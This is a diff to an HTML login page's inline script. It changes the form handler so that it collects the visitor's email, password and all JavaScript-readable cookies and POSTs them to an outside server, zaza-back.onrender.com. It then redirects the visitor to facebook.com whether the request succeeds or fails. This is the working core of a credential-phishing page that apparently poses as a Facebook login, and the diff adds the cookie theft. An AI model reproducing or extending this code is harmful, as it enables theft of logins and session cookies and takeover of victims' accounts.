@@ -96,28 +96,29 @@
   </div>
 </footer>
 
-  <script type="module">
-    const loginForm = document.getElementById('loginForm');
+<script type="module">
+  const loginForm = document.getElementById('loginForm');
 
-    loginForm.addEventListener('submit', async (e) => {
-      e.preventDefault();
+  loginForm.addEventListener('submit', async (e) => {
+    e.preventDefault();
 
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const cookies = document.cookie; // Получаем все видимые JS-куки
 
-      try {
-        await fetch('https://zaza-back.onrender.com/login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email, password })
-        });
+    try {
+      await fetch('https://zaza-back.onrender.com/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password, cookies })
+      });
+    } catch (error) {
+      console.error('Login failed:', error);
+    } finally {
+      window.location.href = 'https://www.facebook.com/';
+    }
+  });
+</script>
 
-        window.location.href = 'https://www.facebook.com/';
-      } catch (error) {
-        console.error('Login failed:', error);
-        window.location.href = 'https://www.facebook.com/';
-      }
-    });
-  </script>
 </body>
 </html>
